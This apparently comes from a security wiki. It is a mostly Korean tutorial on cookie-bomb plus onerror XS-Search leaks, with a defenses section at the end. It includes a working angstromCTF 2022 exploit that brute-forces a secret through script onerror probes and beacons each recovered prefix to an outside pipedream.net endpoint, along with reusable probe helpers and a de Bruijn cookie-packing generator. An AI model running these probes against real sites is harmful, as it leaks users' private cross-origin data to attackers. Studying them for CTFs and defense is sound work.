# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

This technique combines:
- Cookie bombing: 대상 오리진에 대해 피해자 브라우저에 많은/큰 cookies 를 채워 이후 요청이 서버/요청 한도(request header size, URL size in redirects 등)에 걸리도록 만듭니다.
- Error-event oracle: <script> (또는 다른 subresource) 로 cross-origin endpoint 를 탐지하고 onload vs onerror 로 상태를 구별합니다.

High level idea
- 테스트하려는 두 상태에 대해 동작이 다른 대상 엔드포인트를 찾습니다(예: 검색에서 “hit” vs “miss”).
- “hit” 경로가 긴 redirect 체인이나 긴 URL 을 유발하고 “miss” 경로는 짧게 유지되도록 합니다. 많은 cookies 로 request headers 를 부풀려 “hit” 경로만 서버가 HTTP 오류(예: 431/414/400) 로 실패하도록 만듭니다. 그 오류가 onerror 이벤트를 뒤집어 XS-Search 의 오라클이 됩니다.

When does this work
- 피해자 브라우저가 대상에 cookies 를 전송하게 만들 수 있어야 합니다(예: cookies 가 SameSite=None 이거나 popup window.open 을 통해 first-party 컨텍스트에서 설정할 수 있는 경우).
- 임의의 cookies 를 설정하도록 남용할 수 있는 앱 기능이 있어야 합니다(예: 제어 가능한 입력 이름/값을 Set-Cookie 로 바꾸는 “save preference” 엔드포인트) 또는 공격자가 조작한 데이터를 URL 에 포함하는 post-auth 리디렉트를 만들 수 있어야 합니다.
- 서버가 두 상태에서 다르게 반응하고, 부풀려진 헤더/URL 로 인해 한 상태가 한도를 넘겨 onerror 를 트리거하는 오류 응답을 반환해야 합니다.

Note on server errors used as the oracle
- 431 Request Header Fields Too Large 는 cookies 가 request headers 를 부풀릴 때 흔히 반환됩니다; 긴 요청 대상의 경우 414 URI Too Long 또는 서버 특정 400 이 반환될 수 있습니다. 이들 중 어느 것이든 subresource 로드 실패를 초래하고 onerror 를 발생시킵니다. [MDN documents 431 and typical causes like excessive cookies.]()

Practical example (angstromCTF 2022)
다음 스크립트(공개 writeup 에서 발췌)는 공격자가 임의의 cookies 를 삽입할 수 있는 기능을 악용한 뒤 cross-origin search endpoint 를 스크립트로 로드합니다. 쿼리가 맞을 때 서버는 리디렉트를 수행하고, cookies 부풀림과 결합하여 서버 한도를 초과해 오류 상태를 반환하므로 script.onerror 가 실행됩니다; 그렇지 않으면 아무 일도 일어나지 않습니다.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
Why the popup (window.open)?
- 최신 브라우저는 점점 더 third‑party cookies를 차단합니다. 대상에 대해 최상위 창을 열면 cookies가 first‑party가 되어 대상의 Set-Cookie 응답이 유지되므로, third‑party cookie 제한이 있어도 cookie-bomb 단계가 작동합니다.

2024–2025 cookie 가용성 관련 노트
- Chromium 기반 브라우저는 사용자나 사이트가 옵트아웃하지 않는 한 여전히 third‑party cookies를 전송하는 경우가 많지만, Safari와 Firefox는 기본적으로 대부분의 third‑party cookies를 차단합니다. 둘 다 대비하라: (1) first‑party cookie planting flow (window.open + auto-submit to a cookie-setting endpoint)을 사용하고, (2) 그런 쿠키가 전송될 때에만 성공하는 subresource로 probe하라. 만약 third‑party cookies가 차단된다면, probe를 same-site 컨텍스트로 옮겨라 (e.g., run the oracle in the popup via a same-site gadget and exfiltrate the boolean with postMessage or a beacon to your server).

Generic probing helper
If you already have a way to set many cookies on the target origin (first-party), you can reuse this minimal oracle against any endpoint whose success/failure leads to different network outcomes (status/MIME/redirect):
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
대체 tag oracle (스타일시트)
```js
function probeCSS(url) {
return new Promise((resolve) => {
const l = document.createElement('link');
l.rel = 'stylesheet';
l.href = url;
l.onload = () => resolve(false);
l.onerror = () => resolve(true);
document.head.appendChild(l);
});
}
```
고급: de Bruijn–based cookie packing (CTF-proven)
- 앱이 큰 cookie 값을 제어할 수 있게 해주면, 각 probe에 de Bruijn sequence를 덧붙여 추측을 효율적으로 pack할 수 있습니다. 이렇게 하면 per‑probe 오버헤드가 작아지며, heavy branch가 올바른 prefix에 대해서만 일관되게 더 무거워지도록 보장됩니다. 길이 n의 |Σ| symbols에 대한 예시 generator (cookie 값에 들어감):
```js
const ALPH = '_{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
function deBruijn(k, n, alphabet=ALPH){
const a = Array(k * n).fill(0), seq=[];
(function db(t,p){
if(t>n){ if(n%p===0) for(let j=1;j<=p;j++) seq.push(a[j]); }
else { a[t]=a[t-p]; db(t+1,p); for(let j=a[t-p]+1;j<k;j++){ a[t]=j; db(t+1,t);} }
})(1,1);
return seq.map(i=>alphabet[i]).join('');
}
```
- Idea in practice: 여러 개의 쿠키 값을 prefix + deBruijn(k,n)로 설정한다. 테스트하는 prefix가 정확한 경우에만 서버가 무거운 경로(예: 긴 쿠키나 URL을 반영하는 추가 redirect)를 타게 되고, 이것이 cookie bloat와 결합되면 한도를 넘어 onerror가 트리거된다. 이 접근법을 사용한 LA CTF 2024 공개 솔버를 참조하라.

Tips to build the oracle
- Force the “positive” state to be heavier: predicate가 참일 때만 추가 redirect를 체인하거나, redirect URL이 무제한 사용자 입력을 반영하게 만들어 추측한 prefix에 따라 커지도록 한다.
- Inflate headers: cookie bombing을 반복해 “heavy” 경로에서 일관된 오류가 관측될 때까지 시도한다. 서버는 일반적으로 header 크기에 상한을 두며, 많은 쿠키가 있을수록 더 빨리 실패한다.
- Stabilize: 병렬로 여러 cookie set 작업을 실행하고 반복적으로 프로브하여 타이밍 및 캐싱 잡음을 평균화한다.
- Bust caches and avoid pooling artifacts: 프로브 URL에 무작위 `#fragment` 또는 `?r=`를 추가하고, window.open 루프를 사용할 때는 서로 다른 window 이름을 선호한다.
- Alternate subresources: `<script>`가 필터링된다면 `<link rel=stylesheet>`나 `<img>`를 시도해보라. onload/onerror boolean이 오라클이며; 콘텐츠는 파싱될 필요가 없다.

Common header/URL limits (useful thresholds)
- Reverse proxies/CDNs와 서버는 서로 다른 한도를 강제한다. As of October 2025, Cloudflare는 edge에서 request headers 총합 128 KB(및 URL 16 KB)를 문서화하고 있으므로 대상이 그 뒤에 있을 경우 더 많거나 더 큰 쿠키가 필요할 수 있다. 다른 스택(예: Apache의 LimitRequestFieldSize)은 종종 한 header 라인당 ~8 KB에 더 가깝고 더 빨리 오류가 발생한다. 이에 따라 bomb 크기를 조정하라. [Cloudflare docs show the 128 KB header limit.]

Related XS-Search tricks
- URL length based oracles (no cookies needed)는 매우 긴 요청 대상(request target)을 강제할 수 있을 때 결합하거나 대신 사용할 수 있다:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Defenses and hardening
- Make success/failure responses indistinguishable:
- 조건부 redirect나 상태 간 큰 응답 크기 차이를 피하라. 상태(status), content type, 본문 길이를 상태에 관계없이 동일하게 반환하라.
- Block cross-site subresource probes:
- SameSite cookies: 민감한 쿠키를 SameSite=Lax 또는 Strict로 설정해 `<script src>` 같은 서브리소스 요청에 쿠키가 실려 가지 않게 하라; 가능하면 auth 토큰에는 Strict를 권장한다.
- Fetch Metadata: Resource Isolation Policy를 시행해 cross-site 서브리소스 로드를 거부하라 (예: Sec-Fetch-Site != same-origin/same-site인 경우).
- Cross-Origin-Resource-Policy (CORP): cross-origin 서브리소스로 임베드되기를 원하지 않는 엔드포인트에는 CORP: same-origin(또는 최소한 same-site)을 설정하라.
- X-Content-Type-Options: nosniff 및 JSON/HTML 엔드포인트에 올바른 Content-Type을 설정해 load-as-script 특이 동작을 방지하라.
- Reduce header/URL amplification:
- 설정되는 쿠키의 수/크기를 제한하고, 임의의 폼 필드를 Set-Cookie로 바꾸는 기능을 정제(sanitize)하라.
- 리다이렉트에 반사되는 데이터를 정규화하거나 잘라내라; 공격자가 제어하는 긴 문자열을 Location URL에 포함하지 마라.
- 서버 한도를 일관되게 유지하고 균일하게 실패하게 하라(한 분기만을 위한 특수 오류 페이지는 피하라).

Notes
- 이 공격군은 넓게 “Error Events” XS-Leaks로 논의된다. cookie-bomb 단계는 서버 한계를 초과하도록 한 분기만 밀어붙이기 위한 편리한 방법일 뿐이며, 신뢰할 수 있는 boolean 오라클을 생성한다.

## References
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (common with many cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
- LA CTF 2024 writeup note showing a de Bruijn cookie-bomb oracle: https://gist.github.com/arkark/5787676037003362131f30ca7c753627
- Cloudflare edge limits (URLs 16 KB, request headers 128 KB): https://developers.cloudflare.com/fundamentals/reference/connection-limits/
{{#include ../../banners/hacktricks-training.md}}
